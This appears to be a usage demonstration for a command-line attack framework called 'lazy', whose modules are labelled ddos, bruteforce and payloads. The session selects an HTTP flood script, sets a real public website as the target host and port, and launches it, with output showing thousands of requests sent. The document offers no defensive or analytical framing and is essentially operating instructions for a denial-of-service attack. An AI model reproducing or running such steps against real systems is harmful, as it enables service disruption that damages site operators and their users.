# (print available modules)>> lazy# modules

[1]     ddos

[2]     bruteforce

[3]     payloads

# (select module to use [by number])>> lazy# use 1

# (print available scripts for the modules)>> lazy/ddos# scripts

[+]flood/http

[+]flood/tcp

[+]flood/udp

# (select script to use)>> lazy/ddos# set_script flood/http

# (print options for selected script)>> lazy/ddos/flood/http# options

Options:

host .... target to attack

port .... port to target

# (defining the values for options) {

lazy/ddos/flood/http# set host = google.com

lazy/ddos/flood/http# set port = 80

# (info)>>lazy/ddos/flood/http# info
ddos/flood/http:
[+] host = google.com

[+] port = 80

# (starting the script)>> lazy/ddos/flood/http# run

[+] Sending request 15300 to google.com:80^C

lazy/ddos/flood/http# back

lazy#
